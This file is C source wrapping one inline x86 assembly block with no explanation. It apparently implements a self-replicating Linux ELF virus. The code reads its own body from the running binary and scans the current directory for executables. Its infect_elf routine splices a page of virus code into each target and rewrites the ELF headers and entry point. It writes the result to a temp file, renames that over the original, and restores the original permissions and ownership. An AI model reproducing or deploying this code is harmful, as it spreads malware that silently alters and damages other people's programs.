   int main(int argc, char *argv[])
   {
   __asm__("
   time:
       pushl %ebp
       movl %esp,%ebp
       pushl %ebx
       movl 8(%ebp),%ebx
       movl $13,%eax
       int $0x80
       movl -4(%ebp),%ebx
       movl %ebp,%esp
       popl %ebp
       ret

   brk:
       pushl %ebp
       movl %esp,%ebp
       pushl %ebx
       movl 8(%ebp),%ebx
       movl $45,%eax
       int $0x80
       movl -4(%ebp),%ebx
       movl %ebp,%esp
       popl %ebp
       ret

   fstat:
       pushl %ebp
       movl %esp,%ebp
       pushl %ebx
       movl 8(%ebp),%ebx
       movl 12(%ebp),%ecx
       movl $108,%eax
       int $0x80
       movl -4(%ebp),%ebx
       movl %ebp,%esp
       popl %ebp
       ret

   unlink:
       pushl %ebp
       movl %esp,%ebp
       pushl %ebx
       movl 8(%ebp),%ebx
       movl $10,%eax
       int $0x80
       movl -4(%ebp),%ebx
       movl %ebp,%esp
       popl %ebp
       ret

   fchmod:
       pushl %ebp
       movl %esp,%ebp
       pushl %ebx
       movl 8(%ebp),%ebx
       movzwl 12(%ebp),%ecx
       movl $94,%eax
       int $0x80
       movl -4(%ebp),%ebx
       movl %ebp,%esp
       popl %ebp
       ret

   fchown:
       pushl %ebp
       movl %esp,%ebp
       pushl %ebx
       movl 8(%ebp),%ebx
       movzwl 12(%ebp),%ecx
       movzwl 16(%ebp),%edx
       movl $95,%eax
       int $0x80
       movl -4(%ebp),%ebx
       movl %ebp,%esp
       popl %ebp
       ret

   rename:
       pushl %ebp
       movl %esp,%ebp
       pushl %ebx
       movl 8(%ebp),%ebx
       movl 12(%ebp),%ecx
       movl $38,%eax
       int $0x80
       movl -4(%ebp),%ebx
       movl %ebp,%esp
       popl %ebp
       ret

   getdents:
       pushl %ebp
       movl %esp,%ebp
       pushl %ebx
       movl 8(%ebp),%ebx
       movl 12(%ebp),%ecx
       movl 16(%ebp),%edx
       movl $141,%eax
       int $0x80
       movl -4(%ebp),%ebx
       movl %ebp,%esp
       popl %ebp
       ret

   open:
       pushl %ebp
       movl %esp,%ebp
       pushl %ebx
       movl 8(%ebp),%ebx
       movl 12(%ebp),%ecx
       movl 16(%ebp),%edx
       movl $5,%eax
       int $0x80
       movl -4(%ebp),%ebx
       movl %ebp,%esp
       popl %ebp
       ret

   close:
       pushl %ebp
       movl %esp,%ebp
       pushl %ebx
       movl 8(%ebp),%ebx
       movl $6,%eax
       int $0x80
       movl -4(%ebp),%ebx
       movl %ebp,%esp
       popl %ebp
       ret

   lseek:
       pushl %ebp
       movl %esp,%ebp
       pushl %ebx
       movl 8(%ebp),%ebx
       movl 12(%ebp),%ecx
       movl 16(%ebp),%edx
       movl $19,%eax
       int $0x80
       movl -4(%ebp),%ebx
       movl %ebp,%esp
       popl %ebp
       ret

   read:
       pushl %ebp
       movl %esp,%ebp
       pushl %ebx
       movl 8(%ebp),%ebx
       movl 12(%ebp),%ecx
       movl 16(%ebp),%edx
       movl $3,%eax
       int $0x80
       movl -4(%ebp),%ebx
       movl %ebp,%esp
       popl %ebp
       ret

   write:
       pushl %ebp
       movl %esp,%ebp
       pushl %ebx
       movl 8(%ebp),%ebx
       movl 12(%ebp),%ecx
       movl 16(%ebp),%edx
       movl $4,%eax
       int $0x80
       movl -4(%ebp),%ebx
       movl %ebp,%esp
       popl %ebp
       ret

   copy_partial:
       pushl %ebp
       movl %esp,%ebp
       subl $4096,%esp
       pushl %edi
       pushl %esi
       pushl %ebx
       xorl %edi,%edi
       movl $4096,%ebx
       cmpl %ebx,16(%ebp)
       jbe .L16
       leal -4096(%ebp),%esi
   .L17:
       pushl $4096
       pushl %esi
       movl 8(%ebp),%edx
       pushl %edx
       call read
       addl $12,%esp
       cmpl $4096,%eax
       jne .L19
       pushl $4096
       pushl %esi
       movl 12(%ebp),%edx
       pushl %edx
       call write
       addl $12,%esp
       cmpl $4096,%eax
       jne .L19
       addl $4096,%edi
       addl $4096,%ebx
       cmpl %ebx,16(%ebp)
       ja .L17
   .L16:
       movl 16(%ebp),%eax
       subl %edi,%eax
       pushl %eax
       leal -4096(%ebp),%esi
       pushl %esi
       movl 8(%ebp),%edx
       pushl %edx
       call read
       movl %eax,%ebx
       addl $12,%esp
       testl %ebx,%ebx
       jl .L19
       pushl %ebx
       pushl %esi
       movl 12(%ebp),%edx
       pushl %edx
       call write
       cmpl %ebx,%eax
       jne .L19
       xorl %eax,%eax
       jmp .L24
   .L19:
       movl $1,%eax
   .L24:
       leal -4108(%ebp),%esp
       popl %ebx
       popl %esi
       popl %edi
       movl %ebp,%esp
       popl %ebp
       ret

   infect_elf:
       pushl %ebp
       movl %esp,%ebp
       subl $156,%esp
       pushl %edi
       pushl %esi
       pushl %ebx
       movl 24(%ebp),%ebx
       pushl $0
       call brk
       movl %eax,-132(%ebp)
       movl $-1,-144(%ebp)

       jmp tmp_jump
   tmp_call:
       popl -120(%ebp)

       pushl $52
       leal -52(%ebp),%eax
       pushl %eax
       movl 12(%ebp),%ecx
       pushl %ecx
       call read
       addl $16,%esp
       cmpl $52,%eax
       jne .L27
       cmpl $1179403647,-52(%ebp)
       jne .L27
       movw -36(%ebp),%ax
       addw $-2,%ax
       cmpw $1,%ax
       ja .L27
       movw -34(%ebp),%ax
       cmpw $3,%ax
       je .L30
       cmpw $6,%ax
       jne .L27
   .L30:
       cmpl $1,-32(%ebp)
       jne .L27
       movl -28(%ebp),%eax
       movl 16(%ebp),%esi
       movl %eax,(%ebx,%esi)
       movzwl -8(%ebp),%eax
       sall $5,%eax
       movl %eax,-124(%ebp)
       movl -132(%ebp),%edi
       addl %eax,%edi
       movl %edi,-136(%ebp)
       movzwl -4(%ebp),%eax
       leal (%eax,%eax,4),%eax
       sall $3,%eax
       movl %eax,-128(%ebp)
       movl %edi,%ebx
       addl %eax,%ebx
       pushl %ebx
       call brk
       addl $4,%esp
       cmpl %ebx,%eax
       jne .L27
       movl -132(%ebp),%ecx
       movl %ecx,-140(%ebp)
       pushl $0
       movl -24(%ebp),%eax
       pushl %eax
       movl 12(%ebp),%esi
       pushl %esi
       call lseek
       addl $12,%esp
       testl %eax,%eax
       jl .L27
       movl -124(%ebp),%edi
       pushl %edi
       movl -132(%ebp),%ecx
       pushl %ecx
       pushl %esi
       call read
       addl $12,%esp
       cmpl %edi,%eax
       jne .L27
       movl -132(%ebp),%esi
       movl %esi,-148(%ebp)
       xorl %ebx,%ebx
       movl $0,-152(%ebp)
       cmpw $0,-8(%ebp)
       je .L36
       movl %esi,%edx
       addl $20,%edx
   .L38:
       cmpl $0,-152(%ebp)
       je .L39
       addl $4096,-16(%edx)
       jmp .L40
   .L39:
       movl -148(%ebp),%edi
       cmpl $1,(%edi)
       jne .L40
       cmpl $0,-16(%edx)
       jne .L40
       movl -4(%edx),%eax
       cmpl %eax,(%edx)
       jne .L27
       addl -12(%edx),%eax
       movl %eax,-156(%ebp)
       andl $4095,%eax
       movl $4096,%ecx
       subl %eax,%ecx
       movl %ecx,%eax
       cmpl %eax,20(%ebp)
       jg .L27
       movl 28(%ebp),%esi
       addl -156(%ebp),%esi
       movl %esi,-28(%ebp)
       movl -4(%edx),%eax
       movl -16(%edx),%edi
       addl %eax,%edi
       movl %edi,-152(%ebp)
       addl 20(%ebp),%eax
       movl %eax,-4(%edx)
       movl 20(%ebp),%ecx
       addl %ecx,(%edx)
   .L40:
       addl $32,%edx
       addl $32,-148(%ebp)
       incl %ebx
       movzwl -8(%ebp),%eax
       cmpl %eax,%ebx
       jl .L38
   .L36:
       cmpl $0,-152(%ebp)
       je .L27
       movl -152(%ebp),%ecx
       movl 16(%ebp),%esi
       movl 32(%ebp),%edi
       movl %ecx,(%edi,%esi)
       pushl $0
       movl -20(%ebp),%eax
       pushl %eax
       movl 12(%ebp),%esi
       pushl %esi
       call lseek
       addl $12,%esp
       testl %eax,%eax
       jl .L27
       movl -128(%ebp),%edi
       pushl %edi
       movl -136(%ebp),%ecx
       pushl %ecx
       pushl %esi
       call read
       addl $12,%esp
       cmpl %edi,%eax
       jne .L27
       xorl %ebx,%ebx
       cmpw $0,-4(%ebp)
       je .L49
       movl -136(%ebp),%edx
       addl $20,%edx
   .L51:
       movl -4(%edx),%eax
       cmpl %eax,-152(%ebp)
       ja .L52
       addl $4096,%eax
       movl %eax,-4(%edx)
       jmp .L53
   .L52:
       movl (%edx),%esi
       movl %esi,-148(%ebp)
       movl %esi,%eax
       addl -8(%edx),%eax
       cmpl %eax,-156(%ebp)
       jne .L53
       cmpl $1,-16(%edx)
       jne .L27
       addl 20(%ebp),%esi
       movl %esi,(%edx)
   .L53:
       addl $40,%edx
       incl %ebx
       movzwl -4(%ebp),%eax
       cmpl %eax,%ebx
       jl .L51
   .L49:
       movl -20(%ebp),%edi
       movl %edi,-156(%ebp)
       movl -152(%ebp),%ecx
       cmpl %ecx,%edi
       jb .L57
       addl $4096,%edi
       movl %edi,-20(%ebp)
   .L57:
       leal -116(%ebp),%eax
       pushl %eax
       movl 12(%ebp),%esi
       pushl %esi
       call fstat
       addl $8,%esp
       testl %eax,%eax
       jl .L27
       movzwl -108(%ebp),%eax
       pushl %eax
       pushl $577
       movl -120(%ebp),%eax
       pushl %eax
       call open
       movl %eax,-144(%ebp)
       addl $12,%esp
       testl %eax,%eax
       jl .L27
       pushl $0
       pushl $0
       pushl %esi
       call lseek
       addl $12,%esp
       testl %eax,%eax
       jl .L27
       pushl $52
       leal -52(%ebp),%eax
       pushl %eax
       movl -144(%ebp),%edi
       pushl %edi
       call write
       addl $12,%esp
       cmpl $52,%eax
       jne .L27
       movl -124(%ebp),%ecx
       pushl %ecx
       movl -140(%ebp),%esi
       pushl %esi
       pushl %edi
       call write
       addl $12,%esp
       cmpl %eax,-124(%ebp)
       jne .L27
       pushl $0
       movl -124(%ebp),%ebx
       addl $52,%ebx
       pushl %ebx
       movl 12(%ebp),%edi
       pushl %edi
       call lseek
       addl $12,%esp
       testl %eax,%eax
       jl .L27
       movl -152(%ebp),%eax
       subl %ebx,%eax
       pushl %eax
       movl -144(%ebp),%ecx
       pushl %ecx
       pushl %edi
       call copy_partial
       addl $12,%esp
       testl %eax,%eax
       jne .L27
       pushl $4096
       movl 16(%ebp),%esi
       pushl %esi
       movl -144(%ebp),%edi
       pushl %edi
       call write
       addl $12,%esp
       cmpl $4096,%eax
       jne .L27
       movl -156(%ebp),%eax
       subl -152(%ebp),%eax
       pushl %eax
       pushl %edi
       movl 12(%ebp),%ecx
       pushl %ecx
       call copy_partial
       addl $12,%esp
       testl %eax,%eax
       jne .L27
       movl -128(%ebp),%esi
       pushl %esi
       movl -136(%ebp),%edi
       pushl %edi
       movl -144(%ebp),%ecx
       pushl %ecx
       call write
       addl $12,%esp
       cmpl %esi,%eax
       jne .L27
       pushl $0
       movl -128(%ebp),%ebx
       addl -156(%ebp),%ebx
       pushl %ebx
       movl 12(%ebp),%esi
       pushl %esi
       call lseek
       addl $12,%esp
       testl %eax,%eax
       jl .L27
       movl -96(%ebp),%eax
       subl %ebx,%eax
       pushl %eax
       movl -144(%ebp),%edi
       pushl %edi
       pushl %esi
       call copy_partial
       addl $12,%esp
       testl %eax,%eax
       jne .L27
       movl 8(%ebp),%ecx
       pushl %ecx
       movl -120(%ebp),%eax
       pushl %eax
       call rename
       addl $8,%esp
       testl %eax,%eax
       jl .L27
       movzwl -108(%ebp),%eax
       pushl %eax
       pushl %edi
       call fchmod
       addl $8,%esp
       testl %eax,%eax
       jl .L27
       movzwl -102(%ebp),%eax
       pushl %eax
       movzwl -104(%ebp),%eax
       pushl %eax
       pushl %edi
       call fchown
       addl $12,%esp
       testl %eax,%eax
       jl .L27
       movl $1,%ebx
       jmp .L73
   .L27:
       xorl %ebx,%ebx
   .L73:
       movl -132(%ebp),%esi
       pushl %esi
       call brk
       addl $4,%esp
       cmpl $0,-144(%ebp)
       jl .L74
       movl -144(%ebp),%edi
       pushl %edi
       call close
       addl $4,%esp
   .L74:
       movl -120(%ebp),%eax
       pushl %eax
       call unlink
       movl %ebx,%eax
       leal -168(%ebp),%esp
       popl %ebx
       popl %esi
       popl %edi
       movl %ebp,%esp
       popl %ebp
       ret

   main0:
       pushl %ebp
       movl %esp,%ebp
       subl $12608,%esp
       pushl %edi
       pushl %esi
       pushl %eax
       pushl %ebx
       pushl %ecx
       pushl %edx
       movl $0,-12584(%ebp)
       movl $0,-12588(%ebp)
       movl $2250,-12292(%ebp)
       movl $1720,-12296(%ebp)
       movl $2221,-12300(%ebp)
       movl $1616,-12304(%ebp)
       pushl $0
       pushl $0
       movl 8(%ebp),%eax
       pushl %eax
       call open
       movl %eax,%esi
       addl $12,%esp
       testl %esi,%esi
       jl .L99
       pushl $0
       pushl $1000
       pushl %esi
       call lseek
       addl $12,%esp
       testl %eax,%eax
       jl .L77
       movl -12292(%ebp),%eax
       pushl %eax
       leal -12288(%ebp),%eax
       pushl %eax
       pushl %esi
       call read
       movl %eax,%edx
       movl -12292(%ebp),%eax
       addl $12,%esp
       cmpl %eax,%edx
       jne .L77
       pushl %esi
       call close
       movl $-1,%esi
       pushl $0
       pushl $0

       jmp dot_jump
   dot_call:

       call open
       movl %eax,-12576(%ebp)
       addl $16,%esp
       testl %eax,%eax
       jl .L77
       pushl $0
       call time
       leal (%eax,%eax,4),%eax
       leal 3641(,%eax,8),%eax
       movl $729,%ecx
       cltd
       idivl %ecx
       movl %edx,-12592(%ebp)
       addl $4,%esp
       leal -8192(%ebp),%edx
       movl %edx,-12596(%ebp)
   .L81:
       pushl $8192
       movl -12596(%ebp),%ecx
       pushl %ecx
       movl -12576(%ebp),%edx
       pushl %edx
       call getdents
       movl %eax,-12580(%ebp)
       addl $12,%esp
       testl %eax,%eax
       jle .L82
       movl -12596(%ebp),%ecx
       movl %ecx,-12600(%ebp)
       xorl %edi,%edi
   .L86:
       xorl %ebx,%ebx
       cmpl $3,-12588(%ebp)
       jg .L81
       cmpl $15,-12584(%ebp)
       jg .L81
       pushl $0
       pushl $2
       movl -12600(%ebp),%edx
       addl $10,%edx
       movl %edx,-12608(%ebp)
       pushl %edx
       call open
       movl %eax,%esi
       addl $12,%esp
       testl %esi,%esi
       jl .L89
       pushl $268
       leal -12572(%ebp),%eax
       pushl %eax
       pushl %esi
       call getdents
       addl $12,%esp
       testl %eax,%eax
       jge .L90
       movl -12296(%ebp),%eax
       pushl %eax
       movl -12304(%ebp),%eax
       pushl %eax
       movl -12300(%ebp),%eax
       pushl %eax
       movl -12292(%ebp),%eax
       pushl %eax
       leal -12288(%ebp),%eax
       pushl %eax
       pushl %esi
       movl -12608(%ebp),%ecx
       pushl %ecx
       call infect_elf
       addl $28,%esp
       testl %eax,%eax
       je .L91
       incl -12588(%ebp)
       jmp .L90
   .L91:
       incl -12584(%ebp)
   .L90:
       pushl %esi
       call close
       addl $4,%esp
   .L89:
       movl -12592(%ebp),%edx
       leal (%edx,%edx,4),%eax
       leal 3641(,%eax,8),%eax
       movl $729,%ecx
       cltd
       idivl %ecx
       movl %edx,-12592(%ebp)
       movl %ebx,%eax
       incl %ebx
       cmpl %edx,%eax
       jge .L86
   .L95:
       cmpl %edi,-12580(%ebp)
       jne .L96
       xorl %edi,%edi
   .L96:
       movl -12600(%ebp),%edx
       movzwl 8(%edx),%eax
       addl %eax,%edi
       movl -12596(%ebp),%ecx
       addl %edi,%ecx
       movl %ecx,-12600(%ebp)
       movl %ebx,%eax
       incl %ebx
       cmpl %eax,-12592(%ebp)
       jg .L95
       jmp .L86
   .L82:
       movl -12576(%ebp),%edx
       pushl %edx
       call close
       movl $-1,%esi
       addl $4,%esp
   .L77:
       testl %esi,%esi
       jl .L99
       pushl %esi
       call close
   .L99:
       xorl %eax,%eax
       leal -12632(%ebp),%esp
       popl %edx
       popl %ecx
       popl %ebx
       popl %eax
       popl %esi
       popl %edi
       movl %ebp,%esp
       popl %ebp

       movl $0,%ebp
       jmp *%ebp

   dot_jump:
       call dot_call
   .string \".\"

   tmp_jump:
       call tmp_call
   .string \".vi324.tmp\"

   ");
       return 0;
   }
